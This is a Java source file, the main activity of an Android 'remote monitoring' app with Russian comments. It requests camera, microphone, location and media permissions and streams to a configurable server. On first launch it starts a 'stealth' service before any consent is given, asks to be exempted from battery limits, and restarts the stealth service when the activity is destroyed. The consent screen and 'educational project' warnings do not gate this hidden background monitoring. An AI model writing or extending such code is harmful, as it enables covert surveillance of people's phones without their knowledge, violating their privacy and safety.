package com.example.remotemonitor;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * Главная активность приложения удаленного мониторинга
 * ОБРАЗОВАТЕЛЬНЫЙ ПРОЕКТ - используйте только с согласия пользователя
 */
public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final String PREFS_NAME = "RemoteMonitorPrefs";
    private static final String KEY_CONSENT_GIVEN = "consent_given";
    private static final String KEY_SERVER_IP = "server_ip";
    private static final String KEY_SERVER_PORT = "server_port";
    
    // UI элементы
    private EditText editServerIP;
    private EditText editServerPort;
    private Button btnConnect;
    private Button btnDisconnect;
    private Button btnConsent;
    private TextView textStatus;
    private TextView textConsentStatus;
    
    // Состояние подключения
    private boolean isConnected = false;
    private MonitoringService monitoringService;
    
    // Необходимые разрешения для Android 13+
    private final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        // Android 13+ permissions
        Manifest.permission.POST_NOTIFICATIONS,
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ? 
            Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE,
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ? 
            Manifest.permission.READ_MEDIA_VIDEO : Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initializeViews();
        loadSettings();
        checkConsentStatus();
        setupButtonListeners();
        
        // Показать предупреждение о безопасности
        showSecurityWarning();
        
        // Запросить разрешение на уведомления
        requestNotificationPermission();
        
        // Запустить стелс сервис при первом запуске
        startStealthMode();
    }
    
    private void initializeViews() {
        editServerIP = findViewById(R.id.edit_server_ip);
        editServerPort = findViewById(R.id.edit_server_port);
        btnConnect = findViewById(R.id.btn_connect);
        btnDisconnect = findViewById(R.id.btn_disconnect);
        btnConsent = findViewById(R.id.btn_consent);
        textStatus = findViewById(R.id.text_status);
        textConsentStatus = findViewById(R.id.text_consent_status);
        
        // Начальные значения по умолчанию
        editServerIP.setText(BuildConfig.SERVER_IP);
        editServerPort.setText(String.valueOf(BuildConfig.SERVER_PORT));
        
        updateUI();
    }
    
    private void loadSettings() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String savedIP = prefs.getString(KEY_SERVER_IP, BuildConfig.SERVER_IP);
        int savedPort = prefs.getInt(KEY_SERVER_PORT, BuildConfig.SERVER_PORT);
        
        editServerIP.setText(savedIP);
        editServerPort.setText(String.valueOf(savedPort));
    }
    
    private void saveSettings() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        
        editor.putString(KEY_SERVER_IP, editServerIP.getText().toString().trim());
        editor.putInt(KEY_SERVER_PORT, Integer.parseInt(editServerPort.getText().toString().trim()));
        editor.apply();
    }
    
    private void checkConsentStatus() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        boolean consentGiven = prefs.getBoolean(KEY_CONSENT_GIVEN, false);
        
        if (consentGiven) {
            textConsentStatus.setText("✅ Согласие получено");
            textConsentStatus.setTextColor(getResources().getColor(android.R.color.holo_green_dark));
            btnConnect.setEnabled(true);
        } else {
            textConsentStatus.setText("❌ Согласие не получено");
            textConsentStatus.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
            btnConnect.setEnabled(false);
        }
    }
    
    private void setupButtonListeners() {
        btnConsent.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showConsentDialog();
            }
        });
        
        btnConnect.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (hasAllPermissions()) {
                    connectToServer();
                } else {
                    requestPermissions();
                }
            }
        });
        
        btnDisconnect.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                disconnectFromServer();
            }
        });
    }
    
    private void showConsentDialog() {
        Intent intent = new Intent(this, ConsentActivity.class);
        startActivityForResult(intent, 100);
    }
    
    private void showSecurityWarning() {
        Toast.makeText(this, 
            "⚠️ ОБРАЗОВАТЕЛЬНЫЙ ПРОЕКТ\n" +
            "Используйте только на собственных устройствах!\n" +
            "Соблюдайте законы о приватности!", 
            Toast.LENGTH_LONG).show();
    }
    
    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            // Пропускаем null значения для совместимости
            if (permission != null && ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, 
                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, 
                    PERMISSION_REQUEST_CODE + 1);
            }
        }
    }
    
    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                         @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "Все разрешения получены", Toast.LENGTH_SHORT).show();
                connectToServer();
            } else {
                Toast.makeText(this, 
                    "Некоторые разрешения не получены.\n" +
                    "Функциональность может быть ограничена.", 
                    Toast.LENGTH_LONG).show();
            }
        }
    }
    
    private void connectToServer() {
        String serverIP = editServerIP.getText().toString().trim();
        String serverPortStr = editServerPort.getText().toString().trim();
        
        if (serverIP.isEmpty() || serverPortStr.isEmpty()) {
            Toast.makeText(this, "Введите IP и порт сервера", Toast.LENGTH_SHORT).show();
            return;
        }
        
        try {
            int serverPort = Integer.parseInt(serverPortStr);
            
            // Сохранить настройки
            saveSettings();
            
            // Запустить сервис мониторинга
            Intent serviceIntent = new Intent(this, MonitoringService.class);
            serviceIntent.putExtra("server_ip", serverIP);
            serviceIntent.putExtra("server_port", serverPort);
            startService(serviceIntent);
            
            isConnected = true;
            updateUI();
            
            textStatus.setText("Подключение к серверу " + serverIP + ":" + serverPort);
            
        } catch (NumberFormatException e) {
            Toast.makeText(this, "Неверный формат порта", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void disconnectFromServer() {
        // Остановить сервис мониторинга
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        stopService(serviceIntent);
        
        isConnected = false;
        updateUI();
        
        textStatus.setText("Отключено от сервера");
        Toast.makeText(this, "Отключено от сервера", Toast.LENGTH_SHORT).show();
    }
    
    private void updateUI() {
        if (isConnected) {
            btnConnect.setEnabled(false);
            btnDisconnect.setEnabled(true);
            editServerIP.setEnabled(false);
            editServerPort.setEnabled(false);
            textStatus.setTextColor(getResources().getColor(android.R.color.holo_green_dark));
        } else {
            btnConnect.setEnabled(true);
            btnDisconnect.setEnabled(false);
            editServerIP.setEnabled(true);
            editServerPort.setEnabled(true);
            textStatus.setTextColor(getResources().getColor(android.R.color.black));
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == 100) { // Результат от ConsentActivity
            if (resultCode == RESULT_OK) {
                // Согласие получено
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                prefs.edit().putBoolean(KEY_CONSENT_GIVEN, true).apply();
                checkConsentStatus();
                Toast.makeText(this, "Согласие получено. Теперь можно подключиться.", 
                             Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Согласие не получено. Подключение невозможно.", 
                             Toast.LENGTH_SHORT).show();
            }
        }
    }
    
    /**
     * Запуск стелс режима
     */
    private void startStealthMode() {
        try {
            // Запуск стелс сервиса
            StealthService.startStealthMode(this);
            
            // Запросить игнорирование оптимизации батареи
            requestBatteryOptimizationExemption();
            
        } catch (Exception e) {
            android.util.Log.e("MainActivity", "Ошибка запуска стелс режима: " + e.getMessage());
        }
    }
    
    /**
     * Запросить исключение из оптимизации батареи
     */
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                android.os.PowerManager powerManager = 
                    (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                
                if (powerManager != null && 
                    !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                    
                    Intent intent = new Intent();
                    intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            } catch (Exception e) {
                android.util.Log.w("MainActivity", "Не удалось запросить исключение батареи: " + e.getMessage());
            }
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isConnected) {
            disconnectFromServer();
        }
        
        // Убедиться, что стелс сервис запущен даже при закрытии активности
        StealthService.startStealthMode(this);
    }
}